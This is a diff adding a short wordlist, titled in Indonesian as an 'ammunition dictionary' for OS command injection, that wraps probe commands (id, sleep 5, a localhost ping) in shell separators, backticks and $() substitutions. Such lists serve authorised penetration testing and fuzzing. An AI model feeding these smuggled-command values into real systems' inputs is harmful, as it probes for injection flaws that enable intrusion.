@@ -1,0 +1,14 @@
+# === KAMUS AMUNISI V8: OS COMMAND INJECTION ===
+; id ;
+
+| id |
+`id`
+$(id)
+\nid\n
+; sleep 5 ;
+
+| sleep 5 |
+`sleep 5`
+$(sleep 5)
+\nsleep 5\n
+; ping -c 5 127.0.0.1 ;
